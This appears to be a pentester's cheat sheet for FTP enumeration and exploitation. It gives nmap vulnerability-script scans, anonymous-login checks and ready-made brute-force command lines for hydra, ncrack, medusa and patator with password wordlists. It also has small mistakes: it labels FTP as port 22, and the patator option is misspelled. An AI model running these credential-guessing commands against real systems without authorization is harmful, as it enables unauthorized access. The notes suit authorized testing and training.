# FTP (22)

--- 

### 1) FTP Enumeration

- banner grab and check version -- is it exploitable?
- check with nmap:
	- `nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -Pn -oN nmap/ftpVuln -p 21 $IP`
- try logging in -- is there any banner information? 
	- `nc -v <target> 22`
- does it allow anonymous logins?
	- try: `ftp <ip>` -> [anonymous]
	- check what is there
- do you have credentials? ->try to login and see what you have access to 
	  
<br>

### 2) FTP Exploitation

Try default credentials:
- `hydra -s <PORT> -C /usr/share/wordlists/ftp-default-userpass.txt -u -f $IP ftp`

Brute force login:
- with **ncrack**:
	- `ncrack -U <username_list> -P <password_list> <target_ip> -p <service>`
	- i.e. `ncrack -U usernames.txt -P passwords.txt 192.168.44.42 -p ftp`
- with **hydra**:
	- `hydra -L <username_list> -P <password_list> <service>://<target_ip> -T <threads>`
	- for FTP: `hydra -l <username> -P <passwords_list> ftp://<server> -T 4` 
	- i.e. `hydra -l steph -P /usr/share/wordlists/rockyou.txt ftp://10.1.1.68 -T 4`
- with **medusa**:
	- `medusa -h <target_ip> -M <service> -U <username_list> -P <password_list>`
	- i.e. `medusa -h 192.168.12.2 -M ftp -U usernames.txt -P passwords.txt`
- with **patator**:
	- `patator <module> host=FILE0 password=FILE1 user=FILE2 -x <action>:<condition>`
	- i.e. `patator ftp_login host=192.168.2.53 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt -x ingore:mesg='Login incorrect.'`